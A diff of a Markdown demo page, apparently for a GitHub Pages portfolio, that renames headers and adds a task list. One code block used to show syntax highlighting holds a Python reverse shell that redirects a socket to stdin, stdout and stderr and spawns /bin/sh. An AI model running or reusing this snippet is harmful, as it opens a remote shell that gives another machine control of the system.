@@ -1,8 +1,8 @@
-# Header Style 1
+# Huge Graphic
 
 ![Image of Yaktocat](https://octodex.github.com/images/yaktocat.png)
 
-## Header Style 2  
+## Example Code  
 ```html
 <!DOCTYPE html>
 <head>
@@ -16,7 +16,7 @@
 </body>
 ```
 
-### Header Style 3
+### Example Code (smaller)
 
 ```python
 import socket,os,pty
@@ -28,7 +28,9 @@ os.dup2(s.fileno(),1)
 os.dup2(s.fileno(),2)
 pty.spawn("/bin/sh")
 ```
+Notice the colorized syntax highlighting, nice eh?
 
-#### Header Style 4
-##### Header Style 5
-###### Header Style 6
+#### Example Task List 4
+- [ ] Start learning GitHub Pages
+- [ ] Outline my portfolio
+- [ ] Introduce the World to Me
